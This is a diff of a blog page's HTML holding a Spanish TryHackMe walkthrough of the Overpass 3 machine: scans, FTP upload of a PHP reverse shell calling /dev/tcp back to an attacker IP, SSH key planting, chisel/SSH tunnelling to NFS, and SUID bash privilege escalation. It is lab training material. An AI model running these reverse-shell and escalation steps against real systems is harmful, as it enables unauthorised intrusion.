@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1263,7 +1263,7 @@
     <meta property="twitter:description" content="Overpass 3 - Hosting es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y enumeracion para obtener acceso y credenciales para acceder al siguiente usuario. Se obtuvo el puerto NFS localmente donde obtuvimos la clave privada para SSH de otro usuario. Finalmente escalamos privilegios con Bash.">
   
 
-<meta name="generator" content="Hugo 0.92.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1609,22 +1609,22 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/nfs/" class="single__tag" title="nfs">nfs</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/rpc/" class="single__tag" title="rpc">rpc</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/rustbuster/" class="single__tag" title="rustbuster">rustbuster</a></li>
+  <li><a href="https://sckull.github.io/tags/chisel/" class="single__tag" title="chisel">chisel</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">ftp</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/chisel/" class="single__tag" title="chisel">chisel</a></li>
+  <li><a href="https://sckull.github.io/tags/rustbuster/" class="single__tag" title="rustbuster">rustbuster</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/mount/" class="single__tag" title="mount">mount</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/nfs/" class="single__tag" title="nfs">nfs</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/rpc/" class="single__tag" title="rpc">rpc</a></li>
   
 
 </ul>
@@ -1675,7 +1675,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1708,7 +1708,7 @@
 </span><span class="lnt">31
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Mon Jan 11 20:08:53 2021 as: nmap -p- --min-rate 1000 -o allPorts overpass.thm</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Mon Jan 11 20:08:53 2021 as: nmap -p- --min-rate 1000 -o allPorts overpass.thm</span>
 Nmap scan report <span class="k">for</span> overpass.thm <span class="o">(</span>10.10.61.206<span class="o">)</span>
 Host is up <span class="o">(</span>0.36s latency<span class="o">)</span>.
 Not shown: <span class="m">65532</span> filtered ports
@@ -1744,11 +1744,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 80 donde vemos una descripcion de la &ldquo;empresa&rdquo; y de algunos posibles usuarios.<br />
 <img src="/images/posts/thm/overpass3/Screenshot_20210111_193806.png" alt="" /></p>
-<h2 id="rustbuster">RUSTBUSTER</h2>
+<h2 id="rustbuster-">RUSTBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1779,7 +1779,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/overpass3$ /opt/rustbuster/rustbuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirb/common.txt -t <span class="m">35</span> -e php,html,txt
+<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/overpass3$ /opt/rustbuster/rustbuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirb/common.txt -t <span class="m">35</span> -e php,html,txt
 ~ rustbuster v3.0.3 ~ by phra <span class="p">&amp;</span> ps1dr3x ~
 
          _     _                 _         _           _        _                 _         _           _           _     
@@ -1813,7 +1813,7 @@ GET     <span class="m">200</span> OK                          http://overpass.t
 </div><p>Encontramos un directorio que contiene un archivo comprimido, este iñto,p tiene una clave y un archivo encriptado.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1848,7 +1848,7 @@ GET     <span class="m">200</span> OK                          http://overpass.t
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/overpass3$ wget http://overpass.thm/backups/backup.zip
+<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/overpass3$ wget http://overpass.thm/backups/backup.zip
 --2021-01-11 20:18:31--  http://overpass.thm/backups/backup.zip
 Resolving overpass.thm <span class="o">(</span>overpass.thm<span class="o">)</span>... 10.10.61.206
 Connecting to overpass.thm <span class="o">(</span>overpass.thm<span class="o">)</span><span class="p">|</span>10.10.61.206<span class="p">|</span>:80... connected.
@@ -1886,7 +1886,7 @@ kali@kali:~/thm/overpass3$
 </div><p>Importamos la clave y desencriptamos el archivo, este ultimo contiene Nombres, usuarios, contraseñas e informacion de tarjetas de &ldquo;credito&rdquo;.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1902,7 +1902,7 @@ kali@kali:~/thm/overpass3$
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/overpass3$ gpg --import priv.key 
+<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/overpass3$ gpg --import priv.key 
 gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
 gpg: key C9AE71AB3180BC08: public key <span class="s2">&#34;Paradox &lt;paradox@overpass.thm&gt;&#34;</span> imported
 gpg: key C9AE71AB3180BC08: secret key imported
@@ -1923,7 +1923,7 @@ kali@kali:~/thm/overpass3$
 <p>Con las credenciales que encontramos intentamos ingresar por el servicio FTP donde logramos ver los archivos de la pagina y comprobar que tenemos permisos (con el primer usuario) de escritura, es por ello que comprobamos que el archivo <code>shinji.php</code> se muestra en la pagina.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1965,7 +1965,7 @@ kali@kali:~/thm/overpass3$
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/overpass3$ ftp overpass.thm 
+<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/overpass3$ ftp overpass.thm 
 Connected to overpass.thm.
 <span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
 Name <span class="o">(</span>overpass.thm:kali<span class="o">)</span>: <span class="o">[</span>SPOILER<span class="o">]</span>
@@ -2012,12 +2012,12 @@ ftp&gt;
 <p>Subimos una shell inversa (ya que el servicio SSH no nos permitió ingresar), la &ldquo;ejecutamos&rdquo; y logramos obtener una shell con el usuario <code>Apache</code> y nuestra flag <code>web.flag</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php:shinji.php" data-lang="php:shinji.php"><span class="cp">&lt;?php</span>
+<pre class="chroma"><code class="language-php:shinji.php" data-lang="php:shinji.php"><span class="cp">&lt;?php</span>
 <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1338 0&gt;&amp;1&#34;</span><span class="p">);</span>
 <span class="cp">?&gt;</span>
 </code></pre></td></tr></table>
@@ -2028,7 +2028,7 @@ ftp&gt;
 <p>Utilizando la contraseña de <code>paradox</code> logramos obtener una shell con este utilizando <code>su</code>, pero al parecer la consola esta &ldquo;limitada&rdquo; por lo que agregamos nuestra clave publica al archivo <code>authorized_keys</code> para poder ingresar por el servicio SSH y obtener una shell más comoda.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2042,7 +2042,7 @@ ftp&gt;
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">pwd</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">pwd</span>
 /home/paradox/.ssh
 ls -lah
 total 8.0K
@@ -2062,7 +2062,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB<span class="o">[</span>... snip ...<span cl
 <p><img src="/images/posts/thm/overpass3/Screenshot_20210112_183435.png" alt="" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2072,7 +2072,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB<span class="o">[</span>... snip ...<span cl
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#CHISEL en Overpass</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#CHISEL en Overpass</span>
 ./chisel client 10.2.29.162:8080 R:111:127.0.0.1:111
 
 <span class="c1">#Chisel en nuestra maquina</span>
@@ -2085,11 +2085,11 @@ ssh -L 2049:127.0.0.1:2049 -L 20048:127.0.0.1:20048 paradox@overpass.thm
 </div><p><em>En caso de que nuestra maquina no acepte el puerto 111 hay que parar el servicio rpcbind</em></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">systemctl stop rpcbind
+<pre class="chroma"><code class="language-bash" data-lang="bash">systemctl stop rpcbind
 systemctl stop rpcbind.socket
 </code></pre></td></tr></table>
 </div>
@@ -2098,14 +2098,14 @@ systemctl stop rpcbind.socket
 <p>Creamos una carpeta, montamos el punto de acceso con <code>mount</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Creamos una carpeta</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Creamos una carpeta</span>
 mkdir jamesstuff
 
 <span class="c1">#MOUNT</span>
@@ -2119,11 +2119,11 @@ sudo mount -o nolock -t nfs localhost:/home/james /home/kali/thm/overpass3/james
 <p>Ya que tenemos acceso a la carpeta de <code>James</code> a traves de NFS vamos a copiar <code>bash</code> con permisos root o SUID.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cp /bin/bash .
+<pre class="chroma"><code class="language-bash" data-lang="bash">cp /bin/bash .
 chmod +s bash
 </code></pre></td></tr></table>
 </div>
@@ -2134,14 +2134,14 @@ chmod +s bash
 <p>No era necesario obtener el puerto <code>111 y 20048</code>, solo el puerto <strong><code>2049</code></strong> y montar directamente <code>localhost:/</code> a la carpeta especificada.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#SSH - Puerto 2049</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#SSH - Puerto 2049</span>
 ssh -L 2049:127.0.0.1:2049 paradox@overpass.thm
 
 <span class="c1">#Mount</span>
@@ -2444,7 +2444,7 @@ sudo mount -t nfs localhost:/ /home/kali/thm/overpass3/jamesstuff/
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3561,7 +3561,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#nmap">NMAP</a></li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#rustbuster">RUSTBUSTER</a></li>
+        <li><a href="#rustbuster-">RUSTBUSTER</a></li>
       </ul>
     </li>
     <li><a href="#ftp">FTP</a></li>
